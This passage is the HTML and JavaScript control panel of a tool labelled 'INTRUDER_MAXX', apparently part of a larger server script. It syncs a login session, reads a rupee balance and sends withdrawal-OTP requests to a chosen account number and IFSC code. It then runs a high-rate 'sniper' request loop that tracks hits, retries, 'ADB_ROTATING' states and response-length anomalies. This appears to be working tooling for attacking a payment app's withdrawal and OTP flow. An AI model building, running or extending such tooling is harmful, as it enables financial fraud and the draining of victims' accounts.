        .btn { width: 100%; padding: 12px; border: none; font-size: 0.75rem; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: all 0.2s; border-radius: 4px; display: block; margin-bottom: 8px; }
        .btn-start { background: var(--cyan-dim); color: var(--cyan); border: 1px solid var(--cyan); box-shadow: inset 0 0 20px rgba(0,240,255,0.05); }
        .btn-start:hover:not(:disabled) { background: var(--cyan); color: #000; box-shadow: 0 0 20px rgba(0,240,255,0.4); }
        .btn-pause { background: transparent; color: var(--text-main); border: 1px solid var(--border); }
        .btn-pause:hover:not(:disabled) { background: #1a1a20; }
        
        .target-wrapper { display: flex; gap: 8px; margin-top: 5px; }
        input.target { flex: 1; background: #000; border: 1px solid var(--cyan); color: var(--cyan); padding: 10px; font-size: 1rem; font-weight: bold; text-align: center; border-radius: 4px; outline: none; transition: 0.2s; }
        input.target:disabled { border-color: #333; color: #555; background: #0a0a0a; cursor: not-allowed; }
        input.target::placeholder { font-size: 0.7rem; color: #444; }
        
        .btn-clr { flex: 0 0 50px; margin: 0; padding: 0; background: transparent; border: 1px solid var(--border); color: var(--text-sub); border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 0.7rem; }
        .btn-clr:hover:not(:disabled) { border-color: var(--red); color: var(--red); background: rgba(255,51,102,0.1); }
        .btn-clr:disabled { opacity: 0.3; cursor: not-allowed; }

        .auto-badge { display: block; font-size: 0.65rem; color: var(--gold); text-align: center; margin-top: 5px; min-height: 12px; font-weight: bold; }

        .main-feed { grid-area: main; }
        .locked-vault { flex: 0 0 35%; overflow-y: auto; background: rgba(255,170,0,0.03); border-bottom: 2px solid var(--border); }
        .live-feed { flex: 1; overflow-y: auto; }
        
        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
        th { text-align: left; padding: 12px 10px; color: var(--text-sub); position: sticky; top: 0; background: rgba(14,14,17,0.95); backdrop-filter: blur(5px); z-index: 10; font-weight: 800; border-bottom: 1px solid var(--border); }
        td { padding: 8px 10px; border-bottom: 1px solid rgba(255,255,255,0.02); }
        tr { transition: background 0.1s; cursor: pointer; }
        tr:hover { background: rgba(255,255,255,0.05); }
        
        .row-match { background: var(--gold-dim) !important; border-left: 3px solid var(--gold); }
        .row-match td { color: var(--gold); font-weight: bold; text-shadow: 0 0 10px rgba(255,170,0,0.3); }
        .row-report { background: rgba(0, 255, 102, 0.1) !important; border-left: 3px solid var(--green); }
        .row-report td { color: var(--green); font-weight: bold; }

        .pill { padding: 3px 8px; border-radius: 3px; font-size: 0.7rem; font-weight: bold; background: #000; border: 1px solid #333; }
        .p-200 { color: var(--green); border-color: rgba(0,255,102,0.3); }
        .p-403 { color: var(--red); border-color: rgba(255,51,102,0.3); }

        .chart-panel { grid-area: chart; padding: 10px 15px 15px; }
        .inspector { grid-area: insp; }
        .editor-wrap { display: flex; flex-direction: column; flex-grow: 1; padding: 10px; gap: 10px; }
        textarea { flex-grow: 1; background: #050505; border: 1px solid var(--border); border-radius: 4px; color: var(--text-sub); font-size: 0.75rem; padding: 15px; resize: none; outline: none; transition: 0.2s; white-space: pre; }
        textarea:focus { border-color: var(--cyan); color: var(--text-main); box-shadow: 0 0 15px var(--cyan-dim); }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">INTRUDER<span>_MAXX</span></div>
        <div class="status-badge" id="status-box">
            <div class="pulse" id="pulse-dot" style="color: var(--cyan); background: var(--cyan);"></div>
            <span id="status-text" style="color: var(--cyan);">SYSTEM_STANDBY</span>
        </div>
    </div>

    <div class="panel sidebar">
        <div class="panel-title">1. Engine Setup & Target Sync</div>
        <div class="setup-section">
            <input type="text" id="user" placeholder="Email / Username" class="input-dark">
            <input type="password" id="pass" placeholder="Password" class="input-dark">
            <button class="btn btn-pause" onclick="login()" style="margin-bottom: 12px; border-color: var(--text-sub);">Sync Session</button>
            
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 12px;">
                <span id="balText" style="color:var(--green); font-weight:bold; font-size: 1.1rem;">₹0.00</span>
                <button class="btn-clr" onclick="getBalance()" style="padding:4px 10px;">Fetch Bal</button>
            </div>
            
            <input type="number" id="amt" placeholder="Amount (Round Figure)" class="input-dark">
            <input type="text" id="ac_num" placeholder="Target A/C Number" class="input-dark">
            <input type="text" id="ifsc" placeholder="Target IFSC Code" class="input-dark">
            <button class="btn btn-start" onclick="sendOTP()" style="background:var(--gold-dim); color:var(--gold); border-color:var(--gold);">Inject & Generate Payload</button>
        </div>

        <div class="panel-title" style="border-top: 1px solid var(--border);">2. Attack Telemetry</div>
        <div class="stats-grid">
            <div class="stat-box" style="border-right:1px solid var(--border);"><div class="stat-val" id="time">00:00:00</div><div class="stat-lbl">Elapsed</div></div>
            <div class="stat-box"><div class="stat-val" id="rps" style="color: var(--cyan);">0</div><div class="stat-lbl">Req/Sec</div></div>
            <div class="stat-box" style="border-right:1px solid var(--border);"><div class="stat-val" id="ok" style="color: var(--green);">0</div><div class="stat-lbl">Hits</div></div>
            <div class="stat-box"><div class="stat-val" id="retry" style="color: var(--red);">0</div><div class="stat-lbl">Retries</div></div>
        </div>
        
        <div style="padding: 15px; margin-top: auto; border-top: 1px solid var(--border); background: rgba(0,0,0,0.2);">
            <div class="stat-lbl" style="margin-bottom: 8px;">Response Target (Length)</div>
            <div class="target-wrapper">
                <input type="text" class="target" id="tlen" placeholder="Auto-Detect" onchange="fetch('/api/set-target?len='+this.value)">
                <button class="btn-clr" id="btn-clr" onclick="resetTargetLength()" title="Clear Target Length">CLR</button>
            </div>
            <span class="auto-badge" id="auto-badge"></span>
            
            <div style="margin-top: 15px;">
                <button class="btn btn-start" id="btn-start" onclick="fetch('/api/start')">Engage Sniper</button>
                <button class="btn btn-pause" id="btn-pause" onclick="fetch('/api/pause')">Suspend</button>
            </div>
        </div>
    </div>

    <div class="panel main-feed">
        <div class="panel-title" style="color: var(--gold); border-bottom: 1px solid rgba(255,170,0,0.2); background: rgba(255,170,0,0.05);">
            <span style="display:flex; align-items:center; gap:8px;"><div class="pulse" style="color:var(--gold); background:var(--gold);"></div> SECURED TARGETS VAULT</span>
        </div>
        <div class="locked-vault">
            <table>
                <thead><tr><th>Target_ID</th><th>Res_Code</th><th>Bytes</th><th>Timestamp</th></tr></thead>
                <tbody id="matches"></tbody>
            </table>
        </div>

        <div class="panel-title">Live Network Feed</div>
        <div class="live-feed">
            <table>
                <thead style="display:none;"><tr><th>Target_ID</th><th>Res_Code</th><th>Bytes</th><th>Timestamp</th></tr></thead>
                <tbody id="logs"></tbody>
            </table>
        </div>
    </div>

    <div class="panel chart-panel">
        <div class="panel-title" style="padding: 0 0 10px; border: none;">Throughput Matrix</div>
        <div style="position: relative; height: 100%; width: 100%;"><canvas id="rpsChart"></canvas></div>
    </div>

    <div class="panel inspector">
        <div class="panel-title">Packet Inspector</div>
        <div class="editor-wrap">
            <div class="stat-lbl">OUTBOUND // Request</div>
            <textarea id="req-view" disabled readonly  placeholder="Select a packet from the feed to inspect..."></textarea>
            <div class="stat-lbl">INBOUND // Response</div>
            <textarea id="res-view" disabled readonly placeholder="Select a packet from the feed to inspect..."></textarea>
        </div>
    </div>

    <script>
        /* --- SETUP LOGIC --- */
        async function login() {
            updateStatus("SYNCING SESSION...");
            const res = await fetch('/api/login', {
                method: 'POST',
                body: JSON.stringify({ user: document.getElementById('user').value, pass: document.getElementById('pass').value })
            });
            const data = await res.json();
            updateStatus(data.message);
        }
        // async function getBalance() {
        //     const res = await fetch('/api/balance');
        //     const data = await res.json();
        //     if(data.status === 200) {
        //         let roundBal = Math.floor(parseFloat(data.balance));
        //         document.getElementById('balText').innerText = "₹" + roundBal;
        //         document.getElementById('amt').value = roundBal > 10000 ? 10000 : roundBal;
        //         updateStatus("BALANCE RETRIEVED.");
        //     }
        // }

		async function getBalance() {
			const res = await fetch('/api/balance');
			const data = await res.json();
			if(data.status === 200) {
				// Strip commas and convert to float
				let cleanString = String(data.balance).replace(/,/g, '');
				let roundBal = Math.floor(parseFloat(cleanString));
			
			// Failsafe in case parsing errors out
			if (isNaN(roundBal)) roundBal = 0;

			document.getElementById('balText').innerText = "₹" + roundBal;
			document.getElementById('amt').value = roundBal > 10000 ? 10000 : roundBal;
			updateStatus("BALANCE RETRIEVED.");
		}
}
        async function sendOTP() {
            const amt = Math.floor(document.getElementById('amt').value);
            const ac = document.getElementById('ac_num').value;
            const ifsc = document.getElementById('ifsc').value;
            if(!ac || !ifsc) { updateStatus("ERROR: MISSING BANK DETAILS"); return; }
            
            updateStatus("INJECTING AND GENERATING PAYLOAD...");
            const res = await fetch('/api/withdraw-otp', {
                method: 'POST',
                body: JSON.stringify({ amount: amt.toString(), acNumber: ac, ifsc: ifsc })
            });
            const data = await res.json();
            updateStatus(data.message);
        }
        function updateStatus(msg) {
            document.getElementById('status-text').innerText = msg;
        }

        /* --- ATTACK LOGIC & UI --- */
        function resetTargetLength() {
            document.getElementById('tlen').value = '';
            fetch('/api/set-target?len=');
        }

        const ctx = document.getElementById('rpsChart').getContext('2d');
        let grad = ctx.createLinearGradient(0, 0, 0, 150);
        grad.addColorStop(0, 'rgba(0, 240, 255, 0.4)');
        grad.addColorStop(1, 'rgba(0, 240, 255, 0)');
        
        const chart = new Chart(ctx, {
            type: 'line',
            data: { labels: Array(50).fill(''), datasets: [{ data: Array(50).fill(0), borderColor: '#00f0ff', backgroundColor: grad, borderWidth: 2, fill: true, pointRadius: 0, tension: 0.3 }] },
            options: { responsive: true, maintainAspectRatio: false, animation: false, scales: { x: { display: false }, y: { display: false, min: 0 } }, plugins: { legend: { display: false } } }
        });

        const source = new EventSource('/stream');
        source.onmessage = (e) => {
            const d = JSON.parse(e.data);
            
            document.getElementById('time').innerText = d.elapsed;
            document.getElementById('rps').innerText = d.rps;
            document.getElementById('ok').innerText = d.success;
            document.getElementById('retry').innerText = d.retryCount;
            
            const tlenInput = document.getElementById('tlen');
            const clrBtn = document.getElementById('btn-clr');
            const autoBadge = document.getElementById('auto-badge');

            if (document.activeElement !== tlenInput && tlenInput.value !== d.targetLen) {
                tlenInput.value = d.targetLen;
            }

            if (d.running) {
                tlenInput.disabled = true;
                clrBtn.disabled = true;
                if (!d.targetLen) {
                    if (d.baselineLen) {
                        autoBadge.innerText = "BASELINE LOCKED: " + d.baselineLen + " BYTES";
                        autoBadge.style.color = "var(--green)";
                    } else {
                        autoBadge.innerText = "[ AUTO-DETECTING BASELINE... ]";
                        autoBadge.style.color = "var(--gold)";
                    }
                } else {
                    autoBadge.innerText = "";
                }
            } else {
                tlenInput.disabled = false;
                clrBtn.disabled = false;
                autoBadge.innerText = "";
            }

            chart.data.datasets[0].data = d.rpsHistory;
            chart.update();

            const statText = document.getElementById('status-text');
            const dot = document.getElementById('pulse-dot');
            if(d.statusMsg) {
                statText.innerText = d.statusMsg;
                if(d.statusMsg.includes('ADB_ROTATING') || d.statusMsg.includes('ERROR')) { statText.style.color = 'var(--red)'; dot.style.color = 'var(--red)'; dot.style.background = 'var(--red)'; }
                else if(d.statusMsg.includes('ANOMALY') || d.statusMsg.includes('SECURED') || d.statusMsg.includes('RESTORED') || d.statusMsg.includes('DETECTING')) { statText.style.color = 'var(--gold)'; dot.style.color = 'var(--gold)'; dot.style.background = 'var(--gold)'; }
                else if(d.statusMsg.includes('ENGAGED')) { statText.style.color = 'var(--green)'; dot.style.color = 'var(--green)'; dot.style.background = 'var(--green)'; }
                else { statText.style.color = 'var(--cyan)'; dot.style.color = 'var(--cyan)'; dot.style.background = 'var(--cyan)'; }
            }

            const mbody = document.getElementById('matches');
            mbody.innerHTML = '';
            d.matches.forEach(l => {
                const tr = document.createElement('tr');
                tr.className = l.serial.includes('REPORT') ? 'row-report' : 'row-match';
                let pillClass = l.status === '200' ? 'p-200' : (l.status === '403' ? 'p-403' : '');
                // tr.onclick = () => {
                //     document.getElementById('req-view').value = l.rawReq;
                //     document.getElementById('res-view').value = l.rawRes;
                // };
                tr.innerHTML = '<td>'+l.serial+'</td><td><span class="pill '+pillClass+'">'+l.status+'</span></td><td>'+l.length+'</td><td>'+l.time+'</td>';
                mbody.appendChild(tr);
            });

            const tbody = document.getElementById('logs');
            tbody.innerHTML = '';
            d.logs.forEach(l => {
                const tr = document.createElement('tr');
                if(l.isMatch) tr.className = l.serial.includes('REPORT') ? 'row-report' : 'row-match';
                let pillClass = l.status === '200' ? 'p-200' : (l.status === '403' ? 'p-403' : '');
                // tr.onclick = () => {
                //     document.getElementById('req-view').value = l.rawReq;
                //     document.getElementById('res-view').value = l.rawRes;
                // };
                tr.innerHTML = '<td>'+l.serial+'</td><td><span class="pill '+pillClass+'">'+l.status+'</span></td><td>'+l.length+'</td><td>'+l.time+'</td>';
                tbody.appendChild(tr);
            });
        };
    </script>
</body>
</html>
`
